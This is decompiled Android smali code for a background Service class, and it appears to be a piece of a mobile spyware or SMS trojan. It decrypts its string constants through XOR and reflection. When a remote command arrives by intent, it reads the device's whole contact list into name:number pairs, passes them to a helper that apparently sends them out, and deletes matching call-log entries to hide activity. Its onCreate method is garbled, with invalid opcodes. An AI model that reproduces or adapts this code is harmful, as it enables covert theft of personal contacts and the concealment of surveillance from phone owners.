.class public Lcom/kk/liushiwu/com/zz/br;
.super Landroid/app/Service;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private static _100075d(Ljava/lang/String;)Ljava/lang/String;
    .locals 37

    const/4 v12, 0x0

    const/16 v17, 0x0

    const/4 v15, 0x0

    const/16 v28, 0x0

    const/4 v3, 0x0

    const/16 v27, 0x0

    const/4 v5, 0x0

    const/16 v22, 0x0

    const/16 v23, 0x0

    const/16 v34, 0x13

    move/from16 v0, v34

    new-array v7, v0, [B

    fill-array-data v7, :array_0

    const/16 v34, 0x0

    const/16 v35, 0x2

    move-object/from16 v0, p0

    move/from16 v1, v34

    move/from16 v2, v35

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v30

    invoke-virtual/range {p0 .. p0}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v34, v34, -0x2

    move-object/from16 v0, p0

    move/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v31

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v31 .. v31}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x2

    invoke-virtual/range {p0 .. p0}, Ljava/lang/String;->length()I

    move-result v36

    add-int/lit8 v36, v36, -0x2

    move-object/from16 v0, p0

    move/from16 v1, v35

    move/from16 v2, v36

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    move-object/from16 v0, v34

    move-object/from16 v1, v30

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v29

    const/4 v12, 0x0

    :goto_0
    const/16 v34, 0x13

    move/from16 v0, v34

    if-lt v12, v0, :cond_3

    new-instance v28, Ljava/lang/String;

    move-object/from16 v0, v28

    invoke-direct {v0, v7}, Ljava/lang/String;-><init>([B)V

    const/4 v15, 0x2

    const/16 v34, 0x3

    move-object/from16 v0, v28

    move/from16 v1, v34

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v27

    const/16 v15, 0x10

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x11

    move-object/from16 v0, v28

    move/from16 v1, v35

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v27

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v35, "c"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v15, 0x4

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x5

    move-object/from16 v0, v28

    move/from16 v1, v35

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v27

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :try_start_0
    invoke-static/range {v28 .. v28}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    const/16 v34, 0x2

    move/from16 v0, v34

    new-array v4, v0, [Ljava/lang/Class;

    const/16 v34, 0x0

    const-class v35, Ljava/lang/String;

    aput-object v35, v4, v34

    const/16 v34, 0x1

    sget-object v35, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v35, v4, v34

    invoke-virtual {v10, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v14

    const/16 v34, 0x2

    move/from16 v0, v34

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v34, v0

    const/16 v35, 0x0

    aput-object v29, v34, v35

    const/16 v35, 0x1

    const/16 v36, 0x0

    invoke-static/range {v36 .. v36}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v36

    aput-object v36, v34, v35

    move-object/from16 v0, v34

    invoke-virtual {v14, v10, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v34

    move-object/from16 v0, v34

    check-cast v0, [B

    move-object v5, v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_4

    :goto_1
    array-length v0, v5

    move/from16 v20, v0

    move/from16 v21, v20

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v0, v0

    move/from16 v34, v0

    invoke-static/range {v34 .. v34}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v34

    invoke-static/range {v34 .. v34}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v17

    add-int/lit8 v20, v20, -0x1

    sub-int v20, v20, v17

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    const/16 v35, 0x1

    move/from16 v0, v34

    move/from16 v1, v35

    if-ne v0, v1, :cond_4

    const/16 v23, 0x1

    :goto_2
    add-int/lit8 v20, v20, -0x1

    add-int/lit8 v34, v20, -0x2

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v8, v0

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v9, v0

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v8}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v35

    invoke-static/range {v35 .. v35}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v9}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v32

    const/16 v34, 0x10

    move-object/from16 v0, v32

    move/from16 v1, v34

    invoke-static {v0, v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v34

    move/from16 v0, v34

    int-to-byte v6, v0

    add-int/lit8 v34, v6, 0x3c

    move/from16 v0, v34

    int-to-byte v6, v0

    add-int/lit8 v20, v20, -0x2

    const-string v33, ""

    const/4 v12, 0x0

    :goto_3
    move/from16 v0, v20

    if-lt v12, v0, :cond_5

    move/from16 v12, v20

    :goto_4
    move/from16 v0, v21

    if-lt v12, v0, :cond_6

    const/16 v34, 0x1

    move/from16 v0, v23

    move/from16 v1, v34

    if-ne v0, v1, :cond_2

    new-instance v34, Ljava/lang/Exception;

    invoke-direct/range {v34 .. v34}, Ljava/lang/Exception;-><init>()V

    invoke-virtual/range {v34 .. v34}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v34

    const/16 v35, 0x1

    aget-object v13, v34, v35

    invoke-virtual {v13}, Ljava/lang/StackTraceElement;->getClassName()Ljava/lang/String;

    move-result-object v25

    const-string v34, "."

    move-object/from16 v0, v25

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v16

    const/16 v34, -0x1

    move/from16 v0, v16

    move/from16 v1, v34

    if-eq v0, v1, :cond_0

    add-int/lit8 v34, v16, 0x1

    move-object/from16 v0, v25

    move/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v25

    :cond_0
    invoke-virtual {v13}, Ljava/lang/StackTraceElement;->getMethodName()Ljava/lang/String;

    move-result-object v26

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v25 .. v25}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v26

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    const/16 v35, 0x100

    move/from16 v0, v34

    move/from16 v1, v35

    if-le v0, v1, :cond_1

    const/16 v34, 0x0

    const/16 v35, 0x100

    move-object/from16 v0, v24

    move/from16 v1, v34

    move/from16 v2, v35

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    :cond_1
    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v18, v34, -0x1

    const/4 v12, 0x0

    move/from16 v19, v18

    :goto_5
    move/from16 v0, v20

    if-lt v12, v0, :cond_7

    :cond_2
    move/from16 v0, v20

    new-array v0, v0, [B

    move-object/from16 v22, v0

    const/4 v12, 0x0

    :goto_6
    move/from16 v0, v20

    if-lt v12, v0, :cond_9

    new-instance v33, Ljava/lang/String;

    move-object/from16 v0, v33

    move-object/from16 v1, v22

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    return-object v33

    :cond_3
    aget-byte v34, v7, v12

    xor-int/lit8 v34, v34, 0x1b

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v7, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_0

    :catch_0
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/ClassNotFoundException;->printStackTrace()V

    goto/16 :goto_1

    :catch_1
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto/16 :goto_1

    :catch_2
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto/16 :goto_1

    :catch_3
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    goto/16 :goto_1

    :catch_4
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto/16 :goto_1

    :cond_4
    const/16 v23, 0x0

    goto/16 :goto_2

    :cond_5
    aget-byte v34, v5, v12

    xor-int v34, v34, v6

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v5, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_3

    :cond_6
    const/16 v34, 0x0

    aput-byte v34, v5, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_4

    :cond_7
    aget-byte v34, v5, v12

    add-int/lit8 v18, v19, -0x1

    move-object/from16 v0, v24

    move/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v35

    move/from16 v0, v35

    int-to-byte v0, v0

    move/from16 v35, v0

    xor-int v34, v34, v35

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v5, v12

    if-gez v18, :cond_8

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v18, v34, -0x1

    :cond_8
    add-int/lit8 v12, v12, 0x1

    move/from16 v19, v18

    goto/16 :goto_5

    :cond_9
    aget-byte v34, v5, v12

    aput-byte v34, v22, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_6

    nop

    :array_0
    .array-data 1
        0x7at
        0x75t
        0x7ft
        0x69t
        0x74t
        0x72t
        0x7ft
        0x35t
        0x6et
        0x6ft
        0x72t
        0x77t
        0x35t
        0x59t
        0x7at
        0x68t
        0x7et
        0x2dt
        0x2ft
    .end array-data
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 0

    move-wide/16 p53, p47722

    #Field index out of bounds: 53894
    #disallowed odex opcode
    #sget-object-volatile p5, field@53894
    nop

    int-to-short p8, p8

    move-object p0, p10

    div-long p150, p18, p151

    #Type index out of bounds: 37435
    #filled-new-array/range {p41844 .. p41973}, type@37435
    nop

    add-double/2addr p4, p5
.end method

.method public onDestroy()V
    .locals 0

    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 9

    if-eqz p1, :cond_5

    :try_start_0
    const-string v0, "auto"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v0, "ok"

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "==Tcy+rR2MnVzMg1MgEuzNrUNAy8"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "==qKNNa0gDLno6Ah8rueL/eIizLkurou57GHMjQB1c3CMw87"

    invoke-static {v2}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    const-string v0, "no"

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    const-string v0, "o1Ruel9vZX1kMjcBlsZx32c3"

    invoke-static {v0}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "==rA2vHN1trBzTkxAaTQYZaqNQ3d"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v7

    const-wide/16 v1, 0xdac

    :try_start_1
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    :try_start_2
    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1, v7, v0}, Lcom/kk/liushiwu/com/zz/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "lxr"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "E1734drq88jp8PrhQTkBvGK30V9f"

    invoke-static {v4}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "==fx8YZBOAFzPc57NA9P"

    invoke-static {v4}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    if-eqz v0, :cond_2

    :cond_1
    :goto_1
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_6

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_2
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, " "

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_9

    const-string v1, "lxr"

    invoke-virtual {v7, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_8

    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "U=CIn76FjJ2BmJw5RQGsYZUkYzn5"

    invoke-static {v2}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "==mQP9CrqznsoowwMkYBdqV0Mw9p"

    invoke-static {v4}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v2, v0}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_3
    :goto_3
    const-string v0, "del"

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-result v0

    if-eqz v0, :cond_4

    const-wide/16 v0, 0xdac

    :try_start_3
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :goto_4
    :try_start_4
    const-string v0, "017k8NXl7/fuQUQBrzcxJW+f"

    invoke-static {v0}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const-string v3, "kzccBiYMQl1ENAGIsLCh"

    invoke-static {v3}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v0, v4, v5

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    :cond_4
    invoke-virtual {p0, p1}, Lcom/kk/liushiwu/com/zz/br;->stopService(Landroid/content/Intent;)Z

    :cond_5
    :goto_5
    return-void

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_0

    :catch_1
    move-exception v0

    goto :goto_5

    :cond_6
    const-string v1, "==LL3ebWz/TVzMbdOUQBPs8rMwyc"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "gzZwcAcyOQG3qbdX"

    invoke-static {v2}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_1

    const-string v3, ""

    if-eq v2, v3, :cond_1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, ":"

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ","

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto/16 :goto_1

    :cond_7
    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_2

    :cond_8
    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "U=01IgM4MSA8JSEyQgG1xztOUzIi"

    invoke-static {v2}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "==MpWgcvh101EZpNAzqcOEMBxoakMwWj"

    invoke-static {v4}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v2, v0}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :cond_9
    const-string v0, "lxr"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "==mxpoe8taS4oaVBNwGRxalyNApq"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "0zZTGU5cAnBiGWVQGWpEAmVgF3h+3z9WX9kNRUM0RgEox3Gl"

    invoke-static {v2}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :cond_a
    invoke-virtual {p0}, Lcom/kk/liushiwu/com/zz/br;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "==xUQ2JZUEFdREBDQQGIt8tKNAQ0"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "==0oYjUneQsZYh4rYhE/eR4bpGUOKYN6ICOyYQQUYQ0nQjQBK8jAMwYS"

    invoke-static {v2}, Lcom/kk/liushiwu/com/zz/br;->_100075d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/kk/liushiwu/com/zz/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto/16 :goto_4
.end method
